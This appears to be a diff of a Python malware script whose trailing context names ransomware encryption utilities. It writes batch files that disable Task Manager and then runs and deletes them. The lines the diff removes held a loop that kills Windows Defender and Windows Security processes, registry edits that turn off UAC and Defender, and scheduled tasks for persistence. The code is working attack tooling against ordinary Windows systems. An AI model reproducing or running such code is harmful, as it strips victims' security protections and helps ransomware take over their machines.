@@ -11,30 +11,6 @@ import requests
 import os
 import threading
 
-# Define batch file paths
-batch_file = 'admin_script.bat'
-second_file = 'util.bat'
-
-second_content = r'''@echo off
-:loop
-:: Find and kill the PID of MsMpEng.exe (Windows Defender)
-for /f "tokens=2" %%i in ('tasklist /fi "imagename eq MsMpEng.exe" /nh') do (
-    echo Found Defender PID: %%i
-    taskkill /pid %%i /f
-)
-
-:: Find and kill the PID of SecurityHealthService.exe (Windows Security)
-for /f "tokens=2" %%i in ('tasklist /fi "imagename eq SecurityHealthService.exe" /nh') do (
-    echo Found Security PID: %%i
-    taskkill /pid %%i /f
-)
-
-:: Wait for 2 seconds before retrying
-timeout /t 2 >nul
-goto loop
-
-'''
-
 # The content of the batch file that will be executed with administrator privileges
 batch_content = r''' @echo off
 :: Check if the script is running as administrator
@@ -44,32 +20,6 @@ batch_content = r''' @echo off
     ::powershell -Command "Start-Process cmd -ArgumentList '/c', '%%~f0' -Verb runAs"
     ::exit /b
 ::)
-
-schtasks /create /tn "StopDefenderEvery2Seconds" /tr "C:\Scripts\stop_defender.bat" /sc once /st 00:00 /ru SYSTEM
-
-:: Disable UAC (EnableLUA)
-::echo Disabling UAC (EnableLUA)...
-echo spyware
-reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
-echo EnableLUA
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
-echo Prompt
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f
-echo Consent
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
-echo service
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v ServiceEnabled /t REG_DWORD /d 1 /f
-echo antispywate hlm
-reg add "HKLM\SOFTWARE\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f
-echo antivirus hlm
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v DisableAntivirus /t REG_DWORD /d 0 /f
-:: Set Group Policy to always allow Windows Defender service to run
-echo group
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 0 /f
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d 0 /f
-
-reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender"
-
 
 :: Disable Task Manager
 echo Disabling Task Manager...
@@ -123,78 +73,32 @@ if %errorlevel% neq 0 (
     echo Registry Editor is already disabled.
 )
 
-:: Create a scheduled task to run LockDownBrowserInstaller.exe every minute
-echo Creating a scheduled task to run LockDownBrowserInstaller.exe every minute...
-schtasks /create /tn "LockDownBrowserInstaller" /tr "\"%SOURCE_PATH%\"" /sc minute /mo 1 /f >nul 2>&1
-if %errorlevel% equ 0 (
-    echo Scheduled task created successfully.
-) else (
-    echo Failed to create the scheduled task. Check permissions and paths.
-)
-
-:: Verify the scheduled task
-echo Verifying the scheduled task...
-schtasks /query /tn "LockDownBrowserInstaller" >nul 2>&1
-if %errorlevel% equ 0 (
-    echo Scheduled task "LockDownBrowserInstaller" is active.
-) else (
-    echo Scheduled task "LockDownBrowserInstaller" could not be verified. Something went wrong.
-)
-
 '''
-# Create the main batch file
+# Path where the batch file will be created
+batch_file = 'admin_script.bat'
+print("Just created the ad bat")
+
+# Create the batch file
 with open(batch_file, 'w') as f:
     f.write(batch_content)
-print("Just created the main batch file")
 
-# Create the secondary batch file
-with open(second_file, 'w') as f:
-    f.write(second_content)
-print("Just created the secondary batch file")
 
-# Function to execute the main batch file
-def execute_batch_file():
-    try:
-        print("Executing main batch file...")
-        subprocess.run(["cmd", "/c", batch_file], check=True)
-        print("Main batch file executed successfully!")
-    except Exception as e:
-        print(f"Error executing main batch file: {e}")
-
-# Function to execute the secondary batch file
-def execute_secondary_file():
-    try:
-        print("Executing secondary batch file...")
-        subprocess.run(["cmd", "/c", second_file], check=True)
-        print("Secondary batch file executed successfully!")
-    except Exception as e:
-        print(f"Error executing secondary batch file: {e}")
-
-# Function to start threads and execute both batch files
 def windows_payload():
     try:
-        print("Starting threads for batch files...")
-        main_thread = threading.Thread(target=execute_batch_file, daemon=True)
-        secondary_thread = threading.Thread(target=execute_secondary_file, daemon=True)
+        # subprocess.run(
+        #     ["cmd", "/c", "admin_script.bat"],
+        #     creationflags=subprocess.CREATE_NO_WINDOW  # Optional: hide the command window
+        # )
+        subprocess.run(
+            ["cmd", "/c", "admin_script.bat"], creationflags=subprocess.CREATE_NEW_CONSOLE
+        )
 
-        # Start both threads
-        main_thread.start()
-        secondary_thread.start()
-
-        # Wait for both threads to complete
-        main_thread.join()
-        secondary_thread.join()
+        print("Batches file executed successfully!")
     except Exception as e:
-        print(f"Error starting threads: {e}")
-    finally:
-        # Clean up batch files after execution
-        if os.path.exists(batch_file):
-            os.remove(batch_file)
-        if os.path.exists(second_file):
-            os.remove(second_file)
-        print("Batch files cleaned up.")
+        print(f"Error executing batch file: {e}")
 
-# Execute the payload function
+    os.remove("./admin_script.bat")
+
 windows_payload()
 
 # Ransomware Encryption Utilities
